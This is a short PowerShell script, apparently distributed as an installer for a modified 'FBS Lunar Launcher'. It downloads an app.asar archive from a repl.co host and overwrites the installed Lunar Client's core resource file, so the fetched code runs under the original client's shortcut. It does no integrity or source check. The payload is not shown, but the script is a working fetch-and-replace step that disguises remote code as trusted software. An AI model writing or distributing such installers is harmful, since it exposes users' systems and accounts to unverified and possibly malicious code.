Clear-Host
$WebClient = New-Object System.Net.WebClient
Write-Output "Downloading FBS Lunar Launcher..."

$WebClient.DownloadFile("https://thq.itsvops.repl.co/dl/app.asar","$HOME\AppData\Local\Programs\lunarclient\resources\app.asar")
Write-Output "Finished! The FBS Lunar Launcher has been installed and you may now launch it via the original Lunar Client shortcut!"
